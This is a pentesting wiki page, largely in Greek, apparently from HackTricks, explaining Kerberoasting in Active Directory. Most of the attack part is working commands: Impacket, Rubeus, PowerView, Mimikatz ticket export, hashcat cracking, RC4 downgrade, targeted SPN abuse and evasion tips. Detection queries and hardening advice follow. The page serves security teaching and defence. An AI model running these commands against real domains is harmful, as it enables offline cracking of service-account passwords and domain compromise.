# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Το Kerberoasting επικεντρώνεται στην απόκτηση TGS tickets, συγκεκριμένα αυτών που σχετίζονται με services που τρέχουν κάτω από user accounts στο Active Directory (AD), εξαιρουμένων των computer accounts. Η κρυπτογράφηση αυτών των tickets χρησιμοποιεί κλειδιά που προέρχονται από τους κωδικούς των χρηστών, επιτρέποντας offline cracking των credentials. Η χρήση ενός user account ως service υποδεικνύεται από την μη κενή ιδιότητα ServicePrincipalName (SPN).

Οποιοσδήποτε authenticated domain user μπορεί να αιτηθεί TGS tickets, οπότε δεν απαιτούνται ειδικά προνόμια.

### Key Points

- Στοχεύει TGS tickets για services που τρέχουν υπό user accounts (δηλαδή accounts με SPN ρυθμισμένο· όχι computer accounts).
- Τα tickets είναι κρυπτογραφημένα με κλειδί παράγωγο του password του service account και μπορούν να σπάσουν offline.
- Δεν απαιτούνται elevated privileges· οποιοδήποτε authenticated account μπορεί να αιτηθεί TGS tickets.

> [!WARNING]
> Most public tools prefer requesting RC4-HMAC (etype 23) service tickets because they’re faster to crack than AES. RC4 TGS hashes start with `$krb5tgs$23$*`, AES128 with `$krb5tgs$17$*`, and AES256 with `$krb5tgs$18$*`. However, many environments are moving to AES-only. Do not assume only RC4 is relevant.
> Also, avoid “spray-and-pray” roasting. Rubeus’ default kerberoast can query and request tickets for all SPNs and is noisy. Enumerate and target interesting principals first.

### Service account secrets & Kerberos crypto cost

Πολλές υπηρεσίες εξακολουθούν να τρέχουν κάτω από user accounts με χειροδιαχειριζόμενους κωδικούς. Ο KDC κρυπτογραφεί τα service tickets με κλειδιά που προκύπτουν από αυτούς τους κωδικούς και παραδίδει το ciphertext σε οποιοδήποτε authenticated principal, οπότε το kerberoasting δίνει απεριόριστες offline υποθέσεις χωρίς lockouts ή DC telemetry. Ο τρόπος κρυπτογράφησης καθορίζει το κόστος για cracking:

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Το salt μπλοκάρει rainbow tables αλλά επιτρέπει ακόμα γρήγορο cracking για σύντομους κωδικούς. |
| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | ~1000× ταχύτερο από AES· οι επιτιθέμενοι επιβάλλουν RC4 όποτε το `msDS-SupportedEncryptionTypes` το επιτρέπει. |

*Benchmarks from Chick3nman as d in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

Ο confounder του RC4 απλώς τυχαίωνει το keystream· δεν προσθέτει εργασία ανά υπόθεση. Εάν τα service accounts δεν βασίζονται σε τυχαία secrets (gMSA/dMSA, machine accounts, or vault-managed strings), η ταχύτητα compromise εξαρτάται αποκλειστικά από τον GPU budget. Επιβολή AES-only etypes αφαιρεί το δισεκατομμυρίων-υποθέσεων-ανά-δεύτερο downgrade, αλλά οι αδύναμοι ανθρώπινοι κωδικοί εξακολουθούν να πέφτουν στο PBKDF2.

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Εργαλεία πολλαπλών δυνατοτήτων που περιλαμβάνουν ελέγχους kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Εντοπίστε kerberoastable χρήστες
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Τεχνική 1: Ζητήστε TGS και dump από τη μνήμη
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Τεχνική 2: Αυτόματα εργαλεία
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Μια TGS request δημιουργεί Windows Security Event 4769 (A Kerberos service ticket was requested).

### OPSEC και AES-only περιβάλλοντα

- Ζητήστε RC4 σκόπιμα για λογαριασμούς χωρίς AES:
- Rubeus: `/rc4opsec` χρησιμοποιεί tgtdeleg για να απαριθμήσει λογαριασμούς χωρίς AES και να ζητήσει RC4 service tickets.
- Rubeus: `/tgtdeleg` με kerberoast προκαλεί επίσης RC4 requests όπου είναι δυνατόν.
- Roast λογαριασμούς AES-only αντί να αποτυγχάνει σιωπηλά:
- Rubeus: `/aes` απαριθμεί λογαριασμούς με ενεργοποιημένο AES και ζητά AES service tickets (etype 17/18).
- Αν ήδη έχετε TGT (PTT ή από .kirbi), μπορείτε να χρησιμοποιήσετε `/ticket:<blob|path>` με `/spn:<SPN>` ή `/spns:<file>` και να παραλείψετε LDAP.
- Στοχοποίηση, throttling και λιγότερος θόρυβος:
- Χρησιμοποιήστε `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` και `/jitter:<1-100>`.
- Φιλτράρετε για πιθανώς αδύναμους κωδικούς χρησιμοποιώντας `/pwdsetbefore:<MM-dd-yyyy>` (παλαιότεροι κωδικοί) ή στοχεύστε προνομιούχες OUs με `/ou:<DN>`.

Παραδείγματα (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Διατήρηση πρόσβασης / Κατάχρηση

Αν ελέγχετε ή μπορείτε να τροποποιήσετε έναν λογαριασμό, μπορείτε να τον κάνετε kerberoastable προσθέτοντας ένα SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Υποβαθμίστε έναν λογαριασμό για να ενεργοποιήσετε το RC4 για ευκολότερο cracking (απαιτεί δικαιώματα εγγραφής στο αντικείμενο-στόχο):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast μέσω GenericWrite/GenericAll σε έναν χρήστη (προσωρινό SPN)

Όταν το BloodHound δείχνει ότι έχετε έλεγχο σε ένα αντικείμενο χρήστη (π.χ. GenericWrite/GenericAll), μπορείτε αξιόπιστα να κάνετε “targeted-roast” σε αυτόν τον συγκεκριμένο χρήστη ακόμη κι αν δεν έχει επί του παρόντος κανένα SPN:

- Προσθέστε ένα προσωρινό SPN στον ελεγχόμενο χρήστη ώστε να καταστεί roastable.
- Ζητήστε ένα TGS-REP κρυπτογραφημένο με RC4 (etype 23) για εκείνο το SPN για να ευνοήσετε το cracking.
- Σπάστε το `$krb5tgs$23$...` hash με hashcat.
- Καθαρίστε το SPN για να μειώσετε το footprint.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner (το targetedKerberoast.py αυτοματοποιεί add SPN -> request TGS (etype 23) -> remove SPN):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Crack την έξοδο με hashcat autodetect (mode 13100 για `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Σημειώσεις ανίχνευσης: η προσθήκη/αφαίρεση SPNs προκαλεί αλλαγές στον κατάλογο (Event ID 5136/4738 στον στόχο χρήστη) και το TGS request δημιουργεί Event ID 4769. Consider throttling και prompt cleanup.

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (deprecated on some distros)
- `rdate -n <DC_IP>`

### Kerberoast without a domain account (AS-requested STs)

Τον Σεπτέμβριο του 2022, ο Charlie Clark έδειξε ότι αν ένας principal δεν απαιτεί pre-authentication, είναι δυνατόν να αποκτηθεί ένα service ticket μέσω ενός διαμορφωμένου KRB_AS_REQ με την αλλαγή του sname στο σώμα του request, αποκτώντας ουσιαστικά ένα service ticket αντί για TGT. Αυτό αντικατοπτρίζει το AS-REP roasting και δεν απαιτεί έγκυρα domain credentials.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Πρέπει να παρέχετε μια λίστα χρηστών, επειδή χωρίς έγκυρα credentials δεν μπορείτε να κάνετε query στο LDAP με αυτή την τεχνική.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Σχετικά

Αν στοχεύετε χρήστες AS-REP roastable, δείτε επίσης:

{{#ref}}
asreproast.md
{{#endref}}

### Ανίχνευση

Kerberoasting μπορεί να είναι δύσκολο να εντοπιστεί. Αναζητήστε Event ID 4769 από DCs και εφαρμόστε φίλτρα για να μειώσετε τον θόρυβο:

- Εξαιρέστε το όνομα υπηρεσίας `krbtgt` και ονόματα υπηρεσίας που τελειώνουν με `$` (λογαριασμοί υπολογιστών).
- Εξαιρέστε τα αιτήματα από λογαριασμούς μηχανών (`*$$@*`).
- Μόνο επιτυχημένα αιτήματα (Failure Code `0x0`).
- Παρακολουθήστε τύπους κρυπτογράφησης: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Μην ειδοποιείτε μόνο για `0x17`.

Παράδειγμα διαλογής PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Επιπλέον ιδέες:

- Καθορίστε το baseline της κανονικής χρήσης SPN ανά host/χρήστη· ειδοποιήστε για μεγάλα κύματα αιτήσεων για διαφορετικά SPN από έναν μόνο principal.
- Επισημάνετε ασυνήθη χρήση RC4 σε AES-hardened domains.

### Μείωση / Σκληροποίηση

- Use gMSA/dMSA or machine accounts for services. Managed accounts have 120+ character random passwords and rotate automatically, making offline cracking impractical.
- Επιβάλετε AES σε service accounts ρυθμίζοντας το `msDS-SupportedEncryptionTypes` σε AES-only (decimal 24 / hex 0x18) και στη συνέχεια περιστρέψτε τον κωδικό ώστε να προκύψουν κλειδιά AES.
- Όπου είναι δυνατό, απενεργοποιήστε το RC4 στο περιβάλλον σας και παρακολουθήστε για προσπάθειες χρήσης RC4. Σε DCs μπορείτε να χρησιμοποιήσετε την τιμή μητρώου `DefaultDomainSupportedEncTypes` για να καθορίσετε defaults για λογαριασμούς που δεν έχουν ορισμένο `msDS-SupportedEncryptionTypes`. Δοκιμάστε σχολαστικά.
- Αφαιρέστε περιττά SPNs από λογαριασμούς χρηστών.
- Χρησιμοποιήστε μακριούς, τυχαίους κωδικούς για service accounts (25+ chars) αν τα managed accounts δεν είναι εφικτά· απαγορεύστε κοινά passwords και πραγματοποιείτε τακτικούς ελέγχους.

## References

- [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
